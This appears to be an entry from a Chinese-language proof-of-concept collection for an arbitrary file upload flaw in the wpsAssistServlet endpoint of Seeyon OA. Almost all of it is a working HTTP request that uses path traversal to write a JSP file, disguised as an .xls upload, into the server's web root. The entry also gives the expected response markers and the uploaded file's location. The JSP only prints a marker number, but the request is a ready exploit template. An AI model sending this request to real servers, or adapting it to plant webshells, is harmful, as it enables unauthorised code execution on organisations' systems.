﻿# 致远OA wpsAssistServlet接口任意文件上传漏洞

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
POST /seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/01014.jsp&fileId=2 HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: multipart/form-data; boundary=a4d7586ac9d50625dee11e86fa69bc71

--a4d7586ac9d50625dee11e86fa69bc71
Content-Disposition: form-data; name="upload"; filename="123.xls"
Content-Type: application/vnd.ms-excel

<% out.println("215882935");%>  
--a4d7586ac9d50625dee11e86fa69bc71--
```

> 响应代码特征：200

> 响应内容特征：true

> 上传文件定位：/01014.jsp

> 验证文件来源：致远OA wpsAssistServlet接口任意文件上传漏洞.poc
